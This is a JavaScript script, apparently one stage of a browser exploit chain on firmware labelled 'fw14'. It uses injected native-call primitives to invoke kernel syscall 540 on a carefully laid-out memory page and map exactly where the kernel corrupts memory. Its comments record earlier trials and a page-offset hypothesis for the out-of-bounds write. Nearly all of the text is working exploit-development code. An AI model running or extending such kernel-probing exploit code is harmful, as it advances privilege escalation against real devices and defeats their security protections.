// Syscall 540 instrumented trial, v3 — page-offset hypothesis test.
// Evidence: 10/16 (old harness) 540(ownedPtr,0,...) returned -1/errno 3 with
// the 32-byte 0xa5 guard at owned_end broken, 3/3 runs; their owned buffer
// sat at PAGE OFFSET +0x500 with size 0x400, so the broken guard was at
// PAGE OFFSET +0x900. Our v1/v2 trials placed owned at page offset +0xA00
// and scanned only from the buffer onward (to +0x1000): zero writes seen.
// Hypothesis: the kernel writes at a FIXED PAGE OFFSET, (ptr & ~0xFFF)+0x900
// — below v1/v2's buffers, invisible to them, coinciding with the 10/16
// buffer end. v3 replicates the 10/16 layout (owned 0x400 at frame+0x500,
// zero-filled) and scans the ENTIRE frame page 0x000..0x2000 with a
// position-encoded fill so ANY write lands with its exact page offset in
// the record. ONE TRIAL ONLY: reboot before any further 540 work.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys540 !== "number")
    throw new Error("chain_or_sys540_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  if (address % 0x1000 !== 0)
    throw new Error("frame_not_page_aligned_" + address.toString(16));
  var ownedOffset = 0x500, ownedLength = 0x400;
  var scanStart = 0x8, scanLength = 0x2000 - 0x8;
  var ownedAddress = address + ownedOffset;
  var original = Array.from(frame.subarray(scanStart,
    scanStart + scanLength));
  function call540() {
    var call = native.call("sys540",
      [ownedAddress, 0, 0, 0, 0, 0]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    return { ret: call.value, errno: errno };
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  if (api && typeof api.markSync === "function")
    api.markSync("sys540_preflight");
  phase = "arm";
  frame.fill(0, ownedOffset, ownedOffset + ownedLength);
  for (var i = 0; i < scanLength; i++)
    frame[scanStart + i] = (i * 7 + 3) & 255;
  frame.fill(0, ownedOffset, ownedOffset + ownedLength);
  var armed = [];
  for (var a = 0; a < scanLength; a++) armed.push(frame[scanStart + a]);
  if (api && typeof api.markSync === "function")
    api.markSync("sys540_before");
  phase = "call";
  var call = call540();
  if (api && typeof api.markSync === "function")
    api.markSync("sys540_after");
  phase = "measure";
  var ownedIntact = true;
  for (var o = 0; o < ownedLength; o++)
    if (frame[ownedOffset + o] !== 0) { ownedIntact = false; break; }
  var firstOff = -1, lastOff = -1;
  for (var s = 0; s < scanLength; s++) {
    if (frame[scanStart + s] !== armed[s]) {
      if (firstOff === -1) firstOff = s;
      lastOff = s;
    }
  }
  var guardHex = "";
  if (firstOff !== -1) {
    var dumpStart = scanStart + firstOff;
    var dumpLength = Math.min(96, lastOff - firstOff + 1);
    for (var d = 0; d < dumpLength; d++)
      guardHex += ("0" + frame[dumpStart + d].toString(16)).slice(-2);
  }
  for (var r = 0; r < original.length; r++)
    frame[scanStart + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[scanStart + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  result = { id: "syscall540_probe_v3",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { ret: call.ret, errno: call.errno,
      owned_intact: ownedIntact,
      first_off: firstOff, last_off: lastOff,
      extent_bytes: (firstOff === -1) ? 0 : lastOff - firstOff + 1,
      guard_hex: guardHex,
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "syscall540_probe_v3", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
